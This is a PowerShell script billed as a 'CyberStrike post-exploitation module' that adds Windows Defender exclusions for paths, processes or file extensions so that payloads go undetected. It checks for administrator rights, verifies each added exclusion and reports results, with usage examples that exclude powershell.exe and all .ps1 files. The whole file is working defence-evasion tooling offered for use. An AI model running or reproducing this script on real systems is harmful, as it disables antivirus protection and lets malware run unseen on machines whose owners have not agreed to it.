<#
.SYNOPSIS
    Add Windows Defender exclusion paths.
.DESCRIPTION
    CyberStrike post-exploitation module: adds exclusion paths, processes,
    or extensions to Windows Defender to prevent detection of payloads.
    Requires administrative privileges.
.PARAMETER path
    Path, process, or extension to exclude (required).
.PARAMETER type
    Exclusion type: path (default), process, or extension.
.PARAMETER json-output
    Emit structured JSON lines to stdout.
.PARAMETER help
    Show usage and exit.
#>

param(
    [string]$path = "",
    [string]$type = "path",
    [switch]${json-output},
    [switch]$help
)

# ---------------------------------------------------------------------------
# Parse -- prefixed args from $args overflow
# ---------------------------------------------------------------------------
$i = 0
while ($i -lt $args.Count) {
    switch ($args[$i]) {
        "--path"        { $path = $args[$i + 1]; $i += 2 }
        "--type"        { $type = $args[$i + 1]; $i += 2 }
        "--json-output" { ${json-output} = $true; $i++ }
        "--help"        { $help = $true; $i++ }
        default         { $i++ }
    }
}

$JsonOutput = ${json-output}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
function Write-JsonLine {
    param([hashtable]$Data)
    $Data["timestamp"] = (Get-Date -Format "o")
    $Data | ConvertTo-Json -Compress | Write-Output
}

function Write-Msg {
    param([string]$Level, [string]$Message, [hashtable]$Extra = @{})
    if ($JsonOutput) {
        $obj = @{ level = $Level; message = $Message } + $Extra
        Write-JsonLine $obj
    } else {
        $prefix = switch ($Level) { "error" { "[-]" } "success" { "[+]" } default { "[*]" } }
        Write-Host "$prefix $Message"
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
if ($help) {
    $usage = @"
defender_exclude.ps1 - Add Windows Defender exclusions

USAGE:
    .\defender_exclude.ps1 --path PATH [--type process|path|extension] [--json-output] [--help]

OPTIONS:
    --path        Path, process name, or extension to exclude (required)
    --type        Exclusion type: path (default), process, or extension
    --json-output Emit JSON line output
    --help        Show this message

EXAMPLES:
    .\defender_exclude.ps1 --path C:\tools
    .\defender_exclude.ps1 --path powershell.exe --type process --json-output
    .\defender_exclude.ps1 --path .ps1 --type extension
"@
    Write-Host $usage
    exit 0
}

# ---------------------------------------------------------------------------
# Admin check
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    Write-Msg -Level "error" -Message "This script requires administrative privileges. Run as Administrator."
    exit 1
}

# ---------------------------------------------------------------------------
# Validate inputs
# ---------------------------------------------------------------------------
if ([string]::IsNullOrEmpty($path)) {
    Write-Msg -Level "error" -Message "The --path parameter is required."
    exit 1
}

if ($type -notin @("path", "process", "extension")) {
    Write-Msg -Level "error" -Message "Invalid type '$type'. Use 'path', 'process', or 'extension'."
    exit 1
}

# ---------------------------------------------------------------------------
# Cleanup handler
# ---------------------------------------------------------------------------
$cleanupDone = $false
function Invoke-Cleanup {
    if ($script:cleanupDone) { return }
    $script:cleanupDone = $true
    Write-Msg -Level "info" -Message "Cleanup complete. Note: exclusions persist until manually removed."
}
Register-EngineEvent PowerShell.Exiting -Action { Invoke-Cleanup } | Out-Null

# ---------------------------------------------------------------------------
# Get current exclusions
# ---------------------------------------------------------------------------
function Get-CurrentExclusions {
    try {
        $prefs = Get-MpPreference -ErrorAction Stop
        return @{
            paths      = @($prefs.ExclusionPath | Where-Object { $_ })
            processes  = @($prefs.ExclusionProcess | Where-Object { $_ })
            extensions = @($prefs.ExclusionExtension | Where-Object { $_ })
        }
    } catch {
        Write-Msg -Level "error" -Message "Failed to query Defender preferences: $_"
        return @{
            paths      = @()
            processes  = @()
            extensions = @()
        }
    }
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Adding Defender exclusion: type=$type, value=$path"

    # Check current exclusions before adding
    $beforeExclusions = Get-CurrentExclusions

    # Add the exclusion
    $addSuccess = $false
    try {
        switch ($type) {
            "path" {
                Add-MpPreference -ExclusionPath $path -ErrorAction Stop
                Write-Msg -Level "info" -Message "Added path exclusion: $path"
                $addSuccess = $true
            }
            "process" {
                Add-MpPreference -ExclusionProcess $path -ErrorAction Stop
                Write-Msg -Level "info" -Message "Added process exclusion: $path"
                $addSuccess = $true
            }
            "extension" {
                Add-MpPreference -ExclusionExtension $path -ErrorAction Stop
                Write-Msg -Level "info" -Message "Added extension exclusion: $path"
                $addSuccess = $true
            }
        }
    } catch {
        Write-Msg -Level "error" -Message "Failed to add exclusion: $_"
    }

    # Get updated exclusions
    $afterExclusions = Get-CurrentExclusions

    # Build result
    $result = @{
        status           = if ($addSuccess) { "success" } else { "failure" }
        exclusion_type   = $type
        exclusion_value  = $path
        current_exclusions = $afterExclusions
    }

    if ($addSuccess) {
        # Verify the exclusion was actually added
        $verified = $false
        switch ($type) {
            "path"      { $verified = $path -in $afterExclusions.paths }
            "process"   { $verified = $path -in $afterExclusions.processes }
            "extension" { $verified = $path -in $afterExclusions.extensions }
        }
        $result.verified = $verified

        Write-Msg -Level "success" -Message "Defender exclusion added (type=$type, value=$path, verified=$verified)" -Extra $result

        # Display current exclusions summary
        if (-not $JsonOutput) {
            Write-Host ""
            Write-Host "[*] Current Defender exclusions:"
            Write-Host "    Paths:      $($afterExclusions.paths -join ', ')"
            Write-Host "    Processes:  $($afterExclusions.processes -join ', ')"
            Write-Host "    Extensions: $($afterExclusions.extensions -join ', ')"
        }
    } else {
        Write-Msg -Level "error" -Message "Failed to add Defender exclusion." -Extra $result
        exit 1
    }
} catch {
    Write-Msg -Level "error" -Message "Unhandled error: $_"
    exit 1
} finally {
    Invoke-Cleanup
}
